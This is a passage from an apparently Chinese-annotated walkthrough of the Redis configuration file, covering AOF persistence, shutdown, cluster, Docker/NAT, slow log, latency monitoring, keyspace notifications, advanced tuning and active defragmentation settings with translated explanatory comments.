fsync()调用告诉操作系统实际将数据写入磁盘，而不是在输出缓冲区中等待更多数据。\n# 有些操作系统真的会在磁盘上刷新数据，其他操作系统会尽快尝试这样做。\n#\n# Redis支持三种不同的模式:\n# - no: 不要fsync，让操作系统在需要的时候刷新数据。快。\n# - always: 每次写入仅追加日志后进行fsync。慢，但安全。\n# - everysec: 每秒只能进行一次fsync。妥协。\n#\n# 默认是“everysec”，因为这通常是速度和数据安全之间的正确妥协。\n# 这取决于您是否可以将其放宽为“no”，从而让操作系统在需要时刷新输出缓冲区，以获得更好的性能(但如果您可以接受一些数据丢失的想法，请考虑默认的持久性模式快照)，或者相反，使用“always”，它非常慢，但比everysec更安全一些。具体内容参考： http://antirez.com/post/redis-persistence-demystified.html\n#\n# 如果不确定选择哪种，使用默认的“everysec”。\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n# 当AOF的fsync策略设置为always或everysec时，一个后台保存进程(一个后台保存或AOF日志后台重写)正在对磁盘执行大量的I/O，在一些Linux配置中，Redis可能会在fsync()调用上阻塞太长时间。\n# 请注意，目前还没有修复这个问题，因为即使在不同的线程中执行fsync也会阻塞同步写(2)调用。\n#\n# 为了缓解这个问题，可以使用以下选项来防止在BGSAVE或BGREWRITEAOF正在进行时在主进程中调用fsync()。\n# 这意味着当另一个子文件正在保存时，Redis的持久性与“appendfsync no”相同。\n# 实际上，这意味着在最坏的情况下(使用默认的Linux设置)，可能会丢失长达30秒的日志。\n#\n# 如果你有延迟问题，把这个改为“是”。否则，从耐久性的角度来看，这是最安全的选择。\n\nno-appendfsync-on-rewrite no\n\n# 自动重写append only文件。\n# 当AOF日志大小增长到指定的百分比时，Redis能够隐式地自动重写日志文件，调用BGREWRITEAOF。\n# 它是这样工作的: Redis记住最近一次重写后AOF文件的大小(如果重启后没有发生重写，则使用启动时AOF的大小)。\n#\n# 此基本大小与当前大小进行比较. 如果当前大小大于指定的百分比，则会触发重写. 此外，您还需要指定要重写的AOF文件的最小大小, 这对于避免重写AOF文件很有用，即使达到了百分比增长，但它仍然非常小。\n# 指定一个百分数为零以禁用自动AOF重写功能。\nauto-aof-rewrite-percentage 100\nauto-aof-rewrite-min-size 64mb\n\n# 在Redis启动过程中，当AOF数据被加载回内存时，可能会发现AOF文件在结束时被截断。当Redis运行的系统崩溃时，可能会发生这种情况, 特别是当ext4文件系统在没有data=ordered选项的情况下被挂载时(然而，当Redis本身崩溃或中止，但操作系统仍然正常工作时，这就不会发生)。\n# 当这种情况发生时，Redis可以退出错误，或者加载尽可能多的数据(现在的默认值)，并在发现AOF文件在结束时被截断时启动。以下选项控制此行为。\n#\n# 如果aof-load-truncated设置为yes，则加载一个截断的AOF文件，并且Redis服务器开始发送日志来通知用户该事件。\n# 否则，如果该选项被设置为no，服务器将终止并报错并拒绝启动。当该选项设置为no时，用户需要在重新启动服务器之前使用“redis-check-aof”实用程序修复AOF文件。\n#\n# 注意，如果AOF文件在中间被发现损坏，服务器仍然会报错退出。这个选项只适用于当Redis试图从AOF文件读取更多的数据，但没有足够的字节将被发现。\naof-load-truncated yes\n\n# Redis可以创建RDB或AOF格式的只能追加的基本文件. 使用RDB格式总是更快更有效，仅出于向后兼容的目的才支持禁用RDB格式。\naof-use-rdb-preamble yes\n\n# Redis支持在AOF中记录时间戳注释，以支持从特定时间点恢复数据。但是，使用此功能会以一种可能与现有AOF解析器不兼容的方式更改AOF格式。\naof-timestamp-enabled no\n```\n\n\n\n## SHUTDOWN\n\n```sh\n################################ SHUTDOWN #####################################\n\n# 关闭时等待副本的最大时间，以秒为单位。\n#\n# 在关闭期间，宽限期允许任何滞后的副本在主复制存在之前赶上最新的复制偏移量。这段时间可以防止数据丢失，特别是对于没有配置磁盘备份的部署。\n# “shutdown-timeout”值是宽限期的持续时间，单位为秒。它只适用于实例有副本的情况。如果要禁用该特性，请将该值设置为0。\n#\n# shutdown-timeout 10\n\n# 当Redis接收到SIGINT（中断信号：interrupt）或SIGTERM（终止信号：terminal）时，启动关机，默认情况下，如果配置了保存点，则在阻塞操作中将RDB快照写入磁盘。\n# 用于信号关闭的选项可以包括以下值:\n# default:  仅当配置保存点时保存RDB快照。等待滞后的副本赶上。\n# save:     强制数据库保存操作，即使没有配置保存点。\n# nosave:   拒绝数据库保存操作，即使配置了一个或多个保存点。\n# now:      跳过等待滞后的副本。\n# force:    忽略任何通常会阻止服务器退出的错误。\n#\n# 只要“save”和“nosave”不同时设置，就允许任何值的组合。例如: \"nosave force now\"\n#\n# shutdown-on-sigint default\n# shutdown-on-sigterm default\n```\n\n## NON-DETERMINISTIC LONG BLOCKING COMMANDS\n\n```properties\n################ NON-DETERMINISTIC LONG BLOCKING COMMANDS： 不确定的长阻塞命令 #####################\n# 在Redis开始处理或拒绝其他客户端之前，EVAL脚本、函数和某些情况下模块命令的最大时间(以毫秒为单位)。\n#\n# 如果达到最大执行时间，Redis将开始回复大多数命令与BUSY错误。\n# 在这种状态下，Redis只允许执行少量命令。例如，SCRIPT KILL, FUNCTION KILL, SHUTDOWN NOSAVE，可能还有一些模块特定的'allow-busy'命令。\n# SCRIPT KILL和FUNCTION KILL只能停止尚未调用任何写命令的脚本，因此，当用户不想等待脚本的自然终止时，如果脚本已经发出了写命令，则SHUTDOWN NOSAVE可能是停止服务器的唯一方法\n#\n# 缺省值是5秒。可以将其设置为0或负值来禁用此机制(不间断执行)。注意，在过去这个配置有一个不同的名字，现在是一个别名，所以这两个都是一样的:\n#\n# lua-time-limit 5000\n# busy-reply-threshold 5000\n```\n\n## REDIS CLUSTER：集群配置\n\n```properties\n################################ REDIS CLUSTER  ###############################\n\n# 普通的Redis实例不能成为Redis集群的一部分，只有作为集群节点启动的节点可以。\n# 为了启动一个Redis实例作为一个集群节点，启用集群支持取消注释如下:\n#\n# cluster-enabled yes\n\n# 每个集群节点都有一个集群配置文件。此文件不建议手动编辑。它由Redis节点创建和更新。\n# 每个Redis集群节点都需要不同的集群配置文件。\n# 确保在同一系统中运行的实例没有重叠的集群配置文件名。\n#\n# cluster-config-file nodes-6379.conf\n\n# 集群节点超时时间是指一个节点必须不可达的毫秒数，才会被认为处于故障状态。\n#\n# cluster-node-timeout 15000\n\n# 集群端口是集群总线侦听入站连接的端口。\n# 当设置为默认值0时，绑定到命令端口+10000。设置此值要求您在执行cluster meet时指定集群总线端口。\n# cluster-port 0\n\n# 如果发生故障的主服务器的数据看起来太旧，它的副本将避免启动故障转移。\n# 对于副本来说，没有简单的方法可以准确测量其“数据年龄”，因此执行以下两个检查:\n#\n# 1) 如果有多个副本能够进行故障转移，它们将交换消息，以便尝试为副本提供最佳复制偏移(处理来自主服务器的更多数据)。\n#     副本将尝试通过偏移量获得它们的排名，并将与它们的排名成比例的延迟应用于故障转移的开始。\n#\n# 2) 每个副本都计算与主节点最后一次交互的时间. 这可能是接收到的最后一个ping或命令 (如果主服务器仍然处于“已连接”状态), 或者与主服务器断开连接后经过的时间(如果复制链路当前断开)。\n#     如果最后一次交互太旧，副本将根本不会尝试故障转移。\n#\n# 第二点可由用户调整。具体来说，如果自上次与主服务器交互以来，所消耗的时间大于以下情况，副本将不执行故障转移:\n#\n#   (node-timeout * cluster-replica-validity-factor) + repl-ping-replica-period\n#   (节点掉线时间 * 集群副本有效性因子) + 循环PING访问的周期时间\n#\n# 因此，例如，如果node-timeout是30秒，cluster-replica-validity-factor是10，并且假设默认的repo -ping-replica-period是10秒，那么如果它不能与主服务器对话超过310秒，它就不会尝试故障转移。\n# 一个大的cluster-replica-validity-factor可能会允许带有太旧数据的副本故障转移到主节点，而一个太小的值可能会阻止集群完全能够选择一个副本。\n#\n# 为了获得最大可用性，可以将cluster-replica-validity-factor设置为0，这意味着副本将始终尝试故障转移到主服务器，而不管它们最后一次与主服务器交互是什么时候。\n# (然而，他们总是尝试应用一个与他们的偏移等级成比例的延迟)。\n#\n# 0是唯一能够保证当所有分区恢复时，集群始终能够继续运行的值。\n#\n# cluster-replica-validity-factor 10\n\n# 集群副本能够迁移到孤立的主服务器，即没有工作副本的主服务器。\n# 这提高了集群抵抗故障的能力，否则，如果没有工作副本，孤立的主节点就不能在故障发生时被故障转移。但是，只有当它们的旧主人至少还有一定数量的其他工作副本时，副本才会迁移到孤立的主人。这个数字就是“迁移障碍”。迁移障碍为1意味着一个副本只有在它的主副本至少有一个其他工作副本时才会迁移，以此类推。它通常反映集群中每个主节点所需的副本数量。\n#\n# 默认值是1(只有当它们的主副本保留至少一个副本时，副本才会迁移)。\n# 要禁用迁移，只需将其设置为一个非常大的值或将cluster-allow-replica-migration设置为“no”。可以设置0值，但仅在调试时有用，在生产中是危险的。\n#\n# cluster-migration-barrier 1\n\n# 关闭此选项允许使用较少的自动集群配置。它既禁止迁移到孤儿的主节点，也禁止从空的主节点迁移。默认是'yes'(允许自动迁移)。\n#\n# cluster-allow-replica-migration yes\n\n# 默认情况下，如果Redis集群节点检测到至少有一个哈希槽未被发现(没有可用的节点正在为它服务)，它们将停止接受查询。\n# 这样，如果集群部分关闭(例如，一系列哈希槽不再被覆盖)，所有集群最终都将不可用。一旦所有插槽被再次覆盖，它就自动返回可用。\n# 然而，有时您希望正在工作的集群子集继续接受对仍然覆盖的键空间部分的查询。为此，只需将cluster-require-full-coverage选项设置为no。\n#\n# cluster-require-full-coverage yes\n\n# 当此选项设置为yes时，将防止副本在主服务器故障时试图将其主服务器故障转移。但是，如果强制执行，副本仍然可以执行手动故障转移。\n# 这在不同的场景中都很有用，特别是在多个数据中心操作的情况下，如果不是在DC完全故障的情况下，我们希望其中一方永远不会被提升。\n#\n# cluster-replica-no-failover no\n\n# 当该选项设置为yes时，允许节点在集群处于down状态时服务读流量，只要节点认为它拥有插槽。\n# 这在两种情况下是有用的\n# 1. 当应用程序在节点故障或网络分区期间不需要数据一致性时。例如缓存数据。只要节点拥有数据，它就应该能够为其提供服务。\n# 2. 此用例用于集群不满足推荐的三个分片，但又希望启用集群模式并在以后扩展的配置。\n#    如果没有设置这个选项，1或2个分片配置中的主中断将导致整个集群的读/写中断，如果设置了这个选项，则只会导致写中断。如果没有指定的master，插槽的所有权将不会自动改变。\n# \n# cluster-allow-reads-when-down no\n\n\n# 当该选项设置为yes时，允许节点在集群处于down状态时服务发布分片流量，只要节点认为它拥有插槽。\n# 如果应用程序即使在集群全局稳定状态不正常的情况下也想使用pubsub特性，那么这是很有用的。如果应用程序想要确保只有一个分片服务于给定的通道，这个特性应该保持为yes。\n# \n# cluster-allow-pubsubshard-when-down yes\n\n\n# 设置每个集群总线连接的发送字节缓冲区的内存使用限制，超过限制缓冲区将被清空。\n# 这主要是为了防止发送缓冲区在通往慢速连接的链路上无限制地增长(例如PubSub消息被堆积起来)。默认情况下禁用此限制。\n# 而当INFO中的'mem_cluster_links' 和/或 'CLUSTER LINKS ' 命令回显中的'send-buffer-allocated'（已分配的发送缓冲区） 项不断增加时，启用该限制。\n# 建议设置1gb的最小限制，这样集群链接缓冲区默认情况下至少可以容纳一条PubSub消息。(client-query-buffer-limit默认值为1gb。见 ADVANCED CONFIG)\n#\n# cluster-link-sendbuf-limit 0\n \n\n# 集群可以使用此配置配置其宣布的主机名。\n# 对于需要使用TLS服务器名称指示(SNI)或处理基于DNS的路由的应用程序，这是一个常见的用例。\n# 默认情况下，该值仅在CLUSTER SLOTS命令中显示为额外的元数据，但可以使用'cluster-preferred-endpoint-type' 更改。该值通过集群总线传递给所有节点，将其设置为空字符串将删除主机名并传播删除。\n# cluster-announce-hostname \"\"\n\n# 集群可以通告客户端如何使用它们的IP地址连接到它们，用户定义主机名，或者声明它们没有端点。\n# 通过使用 cluster-preferred-end -type 配置值'ip'、'hostname'或'unknown-endpoint'来设置哪个端点显示为首选端点。\n# 这个值控制端点如何返回MOVED/ASKING请求以及CLUSTER插槽的第一个字段。\n# 如果首选端点类型设置为主机名，但没有设置宣布的主机名，则'?’将被返回。\n# 当集群宣称自己具有未知端点时，这表明服务器不知道客户机如何到达集群。这可能发生在某些网络情况下，其中有多个可能的路由到节点，并且服务器不知道客户端选择了哪一个。\n# 在这种情况下，服务器期望客户端通过发出最后一个请求时使用的相同端点进行联系，但是使用响应中提供的端口。\n#\n# cluster-preferred-endpoint-type ip\n\n# In order to setup your cluster make sure to read the documentation\n# available at https://redis.io web site.\n```\n\n## CLUSTER DOCKER/NAT support：集群配置\n\n```properties\n########################## CLUSTER DOCKER/NAT support：容器内集群配置  ########################\n\n# 在某些部署中，无法检测到Redis集群节点，因为地址是NAT-ted或因为端口被转发(典型的情况是Docker和其他容器)。\n# 为了使Redis集群在Docker容器这样的环境中工作，需要一个静态配置，其中每个节点都知道自己的公共地址。\n# 以下四个选项用于此范围，分别是:\n\n# * cluster-announce-ip\n# * cluster-announce-port\n# * cluster-announce-tls-port\n# * cluster-announce-bus-port\n\n# 每个配置都指示节点有关其地址、客户端端口(用于不带TLS和带TLS的连接)和集群消息总线端口。\n# 然后在总线包的报头中发布该信息，以便其他节点能够正确地映射发布该信息的节点的地址。\n\n# \n# 如果“tls-cluster”设置为“yes”，而“cluster-announce-tls-port”被省略或设置为“0”，则“cluster-announce-port”指的是TLS端口。\n# 另请注意，如果“tls-cluster”设置为“no“（默认），则”cluster-announce-tls-port”无效。\n#\n# 如果不使用上述选项，将使用正常的Redis集群自动检测。\n# \n# 注意，在重新映射时，总线端口可能不在客户端端口+10000 的固定偏移量上，因此您可以根据重新映射的方式指定任何端口和总线端口。\n# 如果没有设置总线端口，将像往常一样使用固定偏移量10000\n#\n# 例如:\n#\n# cluster-announce-ip 10.1.1.5\n# cluster-announce-tls-port 6379\n# cluster-announce-port 0\n# cluster-announce-bus-port 6380\n```\n\n## SLOW  LOG：慢查询日志\n\n\n```properties\n################################## SLOW LOG ：满查询日志###################################\n\n# Redis Slow Log 是一个记录超过指定执行时间的查询的系统。执行时间不包括I/O操作，如与客户端交谈、发送应答等，而只包括实际执行命令所需的时间(这是命令执行的唯一阶段，线程被阻塞，不能同时服务其他请求)。\n# 您可以使用两个参数配置慢速日志: 一个参数告诉Redis要超过多少微秒的执行时间才能记录命令，另一个参数是慢速日志的长度。\n# 当记录一个新命令时，最早的命令将从记录的命令队列中删除。\n# 下面的时间以微秒表示，因此1000000相当于一秒。请注意，负数禁用慢日志，而值为零则强制记录每个命令。\nslowlog-log-slower-than 10000\n# 这个长度没有限制。只是要注意它会消耗内存。\n# 可以使用SLOWLOG RESET回收慢日志使用的内存。\nslowlog-max-len 128\n\n```\n\n## LATENCY MONITOR：延迟监控\n\n\n```properties\n################################ LATENCY MONITOR：延迟监控 ##############################\n\n# The Redis latency monitoring subsystem samples different operations at runtime in order to collect data related to possible sources of latency of a Redis instance.\n# Redis延迟监控子系统在运行时对不同的操作进行抽样，以收集与Redis实例的可能延迟来源相关的数据。\n# 通过LATENCY命令，用户可以打印图表并获得报告。\n#\n# 系统只记录执行时间等于或大于通过延迟监视器阈值配置指令指定的毫秒数的操作。\n# 当其值设置为0时，将关闭延迟监视器。\n#\n# 默认情况下，延迟监视是禁用的，因为如果您没有延迟问题，则通常不需要它，并且收集数据会对性能产生影响，尽管影响很小，但可以在大负载下测量。\n# 如果需要，可以在运行时使用命令\"CONFIG SET latency-monitor-threshold <milliseconds>\" 轻松启用延迟监控。\nlatency-monitor-threshold 0\n```\n\n## LATENCY TRACKING：延迟追踪\n\n\n```properties\n################################ LATENCY TRACKING ##############################\n# Redis扩展延迟监控跟踪每个命令的延迟，并通过“INFO latencystats”命令导出百分比分布，并通过LATENCY命令导出累积延迟分布(直方图)。\n# 默认情况下，扩展延迟监视是启用的，因为跟踪命令延迟的开销非常小。\n# latency-tracking yes\n\n# 缺省情况下，通过INFO latencystats命令导出的延迟百分比为p50、p99和p999。\n# latency-tracking-info-percentiles 50 99 99.9\n```\n\n## EVENT NOTIFICATION：事件通知\n\n\n```properties\n############################# EVENT NOTIFICATION ##############################\n# Redis可以通知Pub/Sub客户端在key space中发生的事件。该特性在https://redis.io/topics/notifications上有文档说明\n# 例如，如果“notify-keyspace-events”通知被启用，并且客户端对存储在数据库0中的KEY“foo”执行DEL操作，则两条消息将通过Pub/Sub发布:\n#\n# PUBLISH __keyspace@0__:foo del\n# PUBLISH __keyevent@0__:del foo\n#\n# 可以选择Redis将在一组类中通知的事件。每个类别都由一个单一的字符来标识:\n#\n#  K     Keyspace events, published with __keyspace@<db>__ prefix.\n#  E     Keyevent events, published with __keyevent@<db>__ prefix.\n#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...\n#  $     String commands\n#  l     List commands\n#  s     Set commands\n#  h     Hash commands\n#  z     Sorted set commands\n#  x     Expired events (events generated every time a key expires)\n#  e     Evicted events (events generated when a key is evicted for maxmemory)\n#  n     New key events (Note: not included in the 'A' class)\n#  t     Stream commands\n#  d     Module key type events\n#  m     Key-miss events (Note: It is not included in the 'A' class)\n#  A     Alias for g$lshzxetd, so that the \"AKE\" string means all the events\n#        (Except key-miss events which are excluded from 'A' due to their\n#         unique nature).\n# \n#  “notify-keyspace-events” 以一个由零个或多个字符组成的字符串作为参数。空字符串表示禁用通知。\n#  示例1:要启用列表和通用事件，从事件名称的角度来看，使用: notify-keyspace-events Elg\n#  示例2: 获取订阅通道名的过期KEY的流 __keyevent@0__:expired 使用: notify-keyspace-events Ex\n#\n# 默认情况下，所有通知都是禁用的，因为大多数用户不需要这个功能，而且这个功能有一些开销。注意，如果不指定K或E中的至少一个，则不会传递任何事件。\nnotify-keyspace-events \"\"\n```\n\n## ADVANCED CONFIG\n\n\n```properties\n############################### ADVANCED CONFIG ###############################\n\n# 当哈希表有少量条目且最大条目不超过给定阈值时，使用内存效率高的数据结构进行编码。\n# 可以使用以下指令配置这些阈值。\nhash-max-listpack-entries 512\nhash-max-listpack-value 64\n\n# 列表还以一种特殊的方式进行编码，以节省大量空间。\n# 每个内部列表节点允许的条目数可以指定为固定的最大大小或最大元素数。\n# 对于固定的最大大小，使用-5到-1，这意味着:\n# -5: max size: 64 Kb  <-- not recommended for normal workloads\n# -4: max size: 32 Kb  <-- not recommended\n# -3: max size: 16 Kb  <-- probably not recommended\n# -2: max size: 8 Kb   <-- good\n# -1: max size: 4 Kb   <-- good\n# 正数意味着每个列表节点存储的元素数量不超过这个数字\n# 最高性能选项通常是-2 (8 Kb大小)或-1 (4 Kb大小)，但如果您的用例是唯一的，请根据需要调整设置。\nlist-max-listpack-size -2\n\n# 列表也可以被压缩。\n# 压缩深度是从列表的两边排除压缩的quicklist ziplist节点的数量。\n# 列表的头部和尾部总是未压缩，以便进行快速的推送/弹出操作。设置:\n# 0: 禁用所有列表压缩\n# 1: depth 1 means \"don't start compressing until after 1 node into the list,\n#    going from either the head or tail\"\n#    So: [head]->node->node->...->node->[tail]\n#    [head], [tail] will always be uncompressed; inner nodes will compress.\n# 2: [head]->[next]->node->node->...->node->[prev]->[tail]\n#    2 here means: don't compress head or head->next or tail->prev or tail,\n#    but compress all nodes between them.\n# 3: [head]->[next]->[next]->node->node->...->node->[prev]->[prev]->[tail]\n# etc.\nlist-compress-depth 0\n\n# 当一个集合只是由基数为10的64位有符号整数范围内的整数组成时，集合具有特殊的编码。\n# 下面的配置设置设置了集合大小的限制，以便使用这种特殊的内存节省编码。\nset-max-intset-entries 512\n\n# 包含非整数值的集合，当它们有少量的条目，并且最大的条目不超过给定的阈值时，也使用内存有效的数据结构进行编码。 \n# 可以使用以下指令配置这些阈值。\nset-max-listpack-entries 128\nset-max-listpack-value 64\n\n# 与哈希和列表类似，排序集也经过特殊编码，以节省大量空间。此编码仅在排序集的长度和元素低于以下限制时使用:\nzset-max-listpack-entries 128\nzset-max-listpack-value 64\n\n# HyperLogLog稀疏表示字节限制。限制包括16字节的报头。当使用稀疏表示的HyperLogLog超过该限制时，将被转换为密集表示。\n# 大于16000的值是完全无用的，因为此时密集表示的内存效率更高。\n# 建议值为~ 3000，以获得空间高效编码的好处，而不会降低太多PFADD的速度，使用稀疏编码时PFADD为O(N)。\n# 当不考虑CPU，但考虑空间，并且数据集由基数在0-15000范围内的许多hyperloglog组成时，该值可以提高到~10000。\nhll-sparse-max-bytes 3000\n\n\n# Streams macro node max size / items.\n# 流数据结构是一个大节点的基树，其中编码多个项。使用此配置，可以配置单个节点的字节大小，以及在添加新流条目时切换到新节点之前可以包含的最大项数。\n# 如果下列任何设置被设置为0，则该限制将被忽略，因此，例如，可以通过将max-bytes设置为0并将max-entries设置为所需值来设置max-entries限制。\nstream-node-max-bytes 4096\nstream-node-max-entries 100\n\n# 主动rehash每100毫秒使用1毫秒的CPU时间来帮助重哈希主Redis哈希表(将顶级键映射到值的哈希表)。\n# Redis使用的哈希表实现(参见dicc .c)执行惰性重哈希:你对哈希表执行的操作越多，执行的重哈希“步骤”就越多，所以如果服务器空闲，重哈希永远不会完成，哈希表会占用更多内存。\n#\n# 默认情况下，每秒钟使用这个毫秒10次，以便主动重新散列主字典，尽可能释放内存。\n# 如果不确定:使用“activerehashing no”，如果你有硬延迟要求，在你的环境中，Redis可以不时地以2毫秒的延迟回复查询，这不是一件好事。\n# 如果你没有这样的硬性要求，但想尽快释放内存，请使用\"activerehashing yes\"。\nactiverehashing yes\n\n# 客户端输出缓冲区限制可用于强制断开由于某些原因(常见原因是Pub/Sub客户端消费消息的速度不及发布者生成消息的速度)而未能足够快地从服务器读取数据的客户端。\n# 可以为三种不同类型的客户端设置不同的限制:\n#\n# normal -> normal clients including MONITOR clients\n# replica -> replica clients\n# pubsub -> clients subscribed to at least one pubsub channel or pattern\n#\n# The syntax of every client-output-buffer-limit directive is the following:\n#\n# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>\n#\n# A client is immediately disconnected once the hard limit is reached, or if\n# the soft limit is reached and remains reached for the specified number of\n# seconds (continuously).\n# So for instance if the hard limit is 32 megabytes and the soft limit is\n# 16 megabytes / 10 seconds, the client will get disconnected immediately\n# if the size of the output buffers reach 32 megabytes, but will also get\n# disconnected if the client reaches 16 megabytes and continuously overcomes\n# the limit for 10 seconds.\n#\n# By default normal clients are not limited because they don't receive data\n# without asking (in a push way), but just after a request, so only\n# asynchronous clients may create a scenario where data is requested faster\n# than it can read.\n#\n# Instead there is a default limit for pubsub and replica clients, since\n# subscribers and replicas receive data in a push fashion.\n#\n# Note that it doesn't make sense to set the replica clients output buffer\n# limit lower than the repl-backlog-size config (partial sync will succeed\n# and then replica will get disconnected).\n# Such a configuration is ignored (the size of repl-backlog-size will be used).\n# This doesn't have memory consumption implications since the replica client\n# will share the backlog buffers memory.\n#\n# Both the hard or the soft limit can be disabled by setting them to zero.\nclient-output-buffer-limit normal 0 0 0\nclient-output-buffer-limit replica 256mb 64mb 60\nclient-output-buffer-limit pubsub 32mb 8mb 60\n\n# Client query buffers accumulate new commands. They are limited to a fixed\n# amount by default in order to avoid that a protocol desynchronization (for\n# instance due to a bug in the client) will lead to unbound memory usage in\n# the query buffer. However you can configure it here if you have very special\n# needs, such us huge multi/exec requests or alike.\n#\n# client-query-buffer-limit 1gb\n\n# In some scenarios client connections can hog up memory leading to OOM\n# errors or data eviction. To avoid this we can cap the accumulated memory\n# used by all client connections (all pubsub and normal clients). Once we\n# reach that limit connections will be dropped by the server freeing up\n# memory. The server will attempt to drop the connections using the most \n# memory first. We call this mechanism \"client eviction\".\n#\n# Client eviction is configured using the maxmemory-clients setting as follows:\n# 0 - client eviction is disabled (default)\n#\n# A memory value can be used for the client eviction threshold,\n# for example:\n# maxmemory-clients 1g\n#\n# A percentage value (between 1% and 100%) means the client eviction threshold\n# is based on a percentage of the maxmemory setting. For example to set client\n# eviction at 5% of maxmemory:\n# maxmemory-clients 5%\n\n# In the Redis protocol, bulk requests, that are, elements representing single\n# strings, are normally limited to 512 mb. However you can change this limit\n# here, but must be 1mb or greater\n#\n# proto-max-bulk-len 512mb\n\n# Redis calls an internal function to perform many background tasks, like\n# closing connections of clients in timeout, purging expired keys that are\n# never requested, and so forth.\n#\n# Not all tasks are performed with the same frequency, but Redis checks for\n# tasks to perform according to the specified \"hz\" value.\n#\n# By default \"hz\" is set to 10. Raising the value will use more CPU when\n# Redis is idle, but at the same time will make Redis more responsive when\n# there are many keys expiring at the same time, and timeouts may be\n# handled with more precision.\n#\n# The range is between 1 and 500, however a value over 100 is usually not\n# a good idea. Most users should use the default of 10 and raise this up to\n# 100 only in environments where very low latency is required.\nhz 10\n\n# Normally it is useful to have an HZ value which is proportional to the\n# number of clients connected. This is useful in order, for instance, to\n# avoid too many clients are processed for each background task invocation\n# in order to avoid latency spikes.\n#\n# Since the default HZ value by default is conservatively set to 10, Redis\n# offers, and enables by default, the ability to use an adaptive HZ value\n# which will temporarily raise when there are many connected clients.\n#\n# When dynamic HZ is enabled, the actual configured HZ will be used\n# as a baseline, but multiples of the configured HZ value will be actually\n# used as needed once more clients are connected. In this way an idle\n# instance will use very little CPU time while a busy instance will be\n# more responsive.\ndynamic-hz yes\n\n# When a child rewrites the AOF file, if the following option is enabled\n# the file will be fsync-ed every 4 MB of data generated. This is useful\n# in order to commit the file to the disk more incrementally and avoid\n# big latency spikes.\naof-rewrite-incremental-fsync yes\n\n# When redis saves RDB file, if the following option is enabled\n# the file will be fsync-ed every 4 MB of data generated. This is useful\n# in order to commit the file to the disk more incrementally and avoid\n# big latency spikes.\nrdb-save-incremental-fsync yes\n\n# Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good\n# idea to start with the default settings and only change them after investigating\n# how to improve the performances and how the keys LFU change over time, which\n# is possible to inspect via the OBJECT FREQ command.\n#\n# There are two tunable parameters in the Redis LFU implementation: the\n# counter logarithm factor and the counter decay time. It is important to\n# understand what the two parameters mean before changing them.\n#\n# The LFU counter is just 8 bits per key, it's maximum value is 255, so Redis\n# uses a probabilistic increment with logarithmic behavior. Given the value\n# of the old counter, when a key is accessed, the counter is incremented in\n# this way:\n#\n# 1. A random number R between 0 and 1 is extracted.\n# 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1).\n# 3. The counter is incremented only if R < P.\n#\n# The default lfu-log-factor is 10. This is a table of how the frequency\n# counter changes with a different number of accesses with different\n# logarithmic factors:\n#\n# +--------+------------+------------+------------+------------+------------+\n# | factor | 100 hits   | 1000 hits  | 100K hits  | 1M hits    | 10M hits   |\n# +--------+------------+------------+------------+------------+------------+\n# | 0      | 104        | 255        | 255        | 255        | 255        |\n# +--------+------------+------------+------------+------------+------------+\n# | 1      | 18         | 49         | 255        | 255        | 255        |\n# +--------+------------+------------+------------+------------+------------+\n# | 10     | 10         | 18         | 142        | 255        | 255        |\n# +--------+------------+------------+------------+------------+------------+\n# | 100    | 8          | 11         | 49         | 143        | 255        |\n# +--------+------------+------------+------------+------------+------------+\n#\n# NOTE: The above table was obtained by running the following commands:\n#\n#   redis-benchmark -n 1000000 incr foo\n#   redis-cli object freq foo\n#\n# NOTE 2: The counter initial value is 5 in order to give new objects a chance\n# to accumulate hits.\n#\n# The counter decay time is the time, in minutes, that must elapse in order\n# for the key counter to be decremented.\n#\n# The default value for the lfu-decay-time is 1. A special value of 0 means we\n# will never decay the counter.\n#\n# lfu-log-factor 10\n# lfu-decay-time 1\n```\n\n\n\n## ACTIVE DEFRAGMENTATION\n\n\n```properties\n########################### ACTIVE DEFRAGMENTATION #######################\n#\n# What is active defragmentation?\n# -------------------------------\n#\n# Active (online) defragmentation allows a Redis server to compact the\n# spaces left between small allocations and deallocations of data in memory,\n# thus allowing to reclaim back memory.\n#\n# Fragmentation is a natural process that happens with every allocator (but\n# less so with Jemalloc, fortunately) and certain workloads. Normally a server\n# restart is needed in order to lower the fragmentation, or at least to flush\n# away all the data and create it again. However thanks to this feature\n# implemented by Oran Agra for Redis 4.0 this process can happen at runtime\n# in a \"hot\" way, while the server is running.\n#\n# Basically when the fragmentation is over a certain level (see the\n# configuration options below) Redis will start to create new copies of the\n# values in contiguous memory regions by exploiting certain specific Jemalloc\n# features (in order to understand if an allocation is causing fragmentation\n# and to allocate it in a better place), and at the same time, will release the\n# old copies of the data. This process, repeated incrementally for all the keys\n# will cause the fragmentation to drop back to normal values.\n#\n# Important things to understand:\n#\n# 1. This feature is disabled by default, and only works if you compiled Redis\n#    to use the copy of Jemalloc we ship with the source code of Redis.\n#    This is the default with Linux builds.\n#\n# 2. You never need to enable this feature if you don't have fragmentation\n#    issues.\n#\n# 3. Once you experience fragmentation, you can enable this feature when\n#    needed with the command \"CONFIG SET activedefrag yes\".\n#\n# The configuration parameters are able to fine tune the behavior of the\n# defragmentation process. If you are not sure about what they mean it is\n# a good idea to leave the defaults untouched.\n\n# Active defragmentation is disabled by default\n# activedefrag no\n\n# Minimum amount of fragmentation waste to start active defrag\n# active-defrag-ignore-bytes 100mb\n\n# Minimum percentage of fragmentation to start active defrag\n# active-defrag-threshold-lower 10\n\n# Maximum percentage of fragmentation at which we use maximum effort\n# active-defrag-threshold-upper 100\n\n# Minimal effort for defrag in CPU percentage, to be used when the lower\n# threshold is reached\n# active-defrag-cycle-min 1\n\n# Maximal effort for defrag in CPU percentage, to be used when the upper\n# threshold is reached\n# active-defrag-cycle-max 25\n\n# Maximum number of set/hash/zset/list fields that will be processed from\n# the main dictionary scan\n# active-defrag-max-scan-fields 1000\n\n# Jemalloc background thread for purging will be enabled by default\njemalloc-bg-thread yes\n\n# It is possible to pin different threads and processes of Redis to specific\n# CPUs in your system, in order to maximize the performances of the server.\n# This is useful both in order to pin different Redis threads in different\n# CPUs, but also in order to make sure that multiple Redis instances running\n# in the same host will be pinned to different CPUs.\n#\n# Normally you can do this using the \"taskset\" command, however it is also\n# possible to this via Redis configuration directly, both in Linux and FreeBSD.\n#\n# You can pin the server/IO threads, bio threads, aof rewrite child process, and\n# the bgsave child process. The syntax to specify the cpu list is the same as\n# the taskset command:\n#\n# Set 